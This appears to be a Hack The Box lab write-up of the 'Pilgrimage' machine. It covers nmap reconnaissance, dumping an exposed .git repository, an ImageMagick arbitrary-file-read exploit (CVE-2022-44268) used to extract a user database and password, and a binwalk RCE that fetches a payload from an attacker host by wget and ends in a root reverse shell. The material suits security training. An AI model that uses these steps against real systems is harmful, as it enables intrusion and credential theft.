---
title: "Pilgrimage - Writeup"
classes: single
ribbon: LightBlue
categories:
  - writeup
tags:
  - writeups
  - pentest
  - writeup
  - oscp
  - shell
  - exploit
  - htb
  - hackthebox
  - machine
  - easy
  - linux
toc: true
hide_title: true
excerpt: ""
sidebar:
        nav: "menu_writeups"
---

## Pilgrimage
![](https://kar0nx.github.io/assets/images/writeup/33632db6c1f4323a58452d8fcfc7eee0.png)
## Reconnaissance

IP: 10.10.11.219
## NMAP

```
nmap -T4 -p- -A 10.10.11.219
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-31 08:36 UTC
Nmap scan report for 10.10.11.219
Host is up (0.030s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
|_http-server-header: nginx/1.18.0
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   29.18 ms 10.10.14.1
2   30.07 ms 10.10.11.219

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.88 seconds
```

We can see that site redirect us to pilgrimage.htb. After adding to etc/hosts rerun nmap

```
nmap -T4 -p80 -A pilgrimage.htb
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-31 09:11 UTC
Nmap scan report for pilgrimage.htb (10.10.11.219)
Host is up (0.030s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Pilgrimage - Shrink Your Images
|_http-server-header: nginx/1.18.0
| http-git: 
|   10.10.11.219:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   29.84 ms 10.10.14.1
2   30.60 ms pilgrimage.htb (10.10.11.219)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.63 seconds
```

and we can spot that there is /.git Git repozitory
## Website
### Site

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831103826.png)

In register page we can create account 

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831123620.png)

/.git page

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831111448.png)

### git-dumper

Run git-dumper on .git

```
git-dumper http://pilgrimage.htb/.git/ /root/Desktop/pilgrimage.htb
```

Checking history (only one commit)

```
git log
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831113549.png)

In git directory I spot magic, checked that is linux binary. Searching google I found that this is part of ImageMagick 

https://github.com/ImageMagick/ImageMagick/issues/7915

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831121639.png)

So we can check version in our VM and search for exploits:

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831121732.png)

And I found Arbitrary File Read exploit for this version CVE-2022-44268
https://www.exploit-db.com/exploits/51261
PoC: https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC

Starting with getting random image to our directory, then commands from Poc points 1-3

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831123406.png)

now upload this pngout.png file on server and copy link

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831123715.png)

wget file on kali and copy command from step 5 poc

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831123856.png)

```
identify -verbose 68b425bb42945.png
```

In description we can spot sth in hex, copy that and paste in poc step 6 python decode

```
python3 -c 'print(bytes.fromhex("3132372e302e302e31096c6f63616c686f73740a3132372e302e312e310970696c6772696d6167652070696c6772696d6167652e6874620a0a232054686520666f6c6c6f77696e67206c696e65732061726520646573697261626c6520666f7220495076362063617061626c6520686f7374730a3a3a3120202020206c6f63616c686f7374206970362d6c6f63616c686f7374206970362d6c6f6f706261636b0a666630323a3a31206970362d616c6c6e6f6465730a666630323a3a32206970362d616c6c726f75746572730a").decode("utf-8"))'
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831124216.png)

Great it works, so we know that we can read file, best place to start is while we login login.php confirming credentials with db at /var/db/pilgrimage 

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831123515.png)

## Gaining Access

Like before create malicious png, send to server, download on kali:

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831124646.png)

Nowe we get very long answer so copy it to txt file 

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831124917.png)

Now convert it, open sqlite db and dump database

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831125142.png)

We got user emily with password abigchonkyboi123, so let's login via ssh

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831125407.png)

## Privilege Escalation

In linpeas I found 2 interesting places to start 

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831130651.png)

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831130032.png)

Searching google for this write.ul I didn't find anything usefull for priv esc, so let's check for this malwarescan.sh

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831132115.png)

It looks like we can command injection $File, quick check for binwalk version 

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831132602.png)

Searching google I found that version is vulnerable to RCE (which is great cause root is running this process) 
https://www.exploit-db.com/exploits/51249

Ok, so let's start by creating empty png file add our ip and port

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831133445.png)

Download exploit on machine, save where malwarescan.sh executes commadn /var/www/pilgrimage.htb/shrunk

```
wget http://10.10.14.8:81/binwalk_exploit.png
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831134028.png)

And we got reverse shell as root, now grab root.txt

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250831134005.png)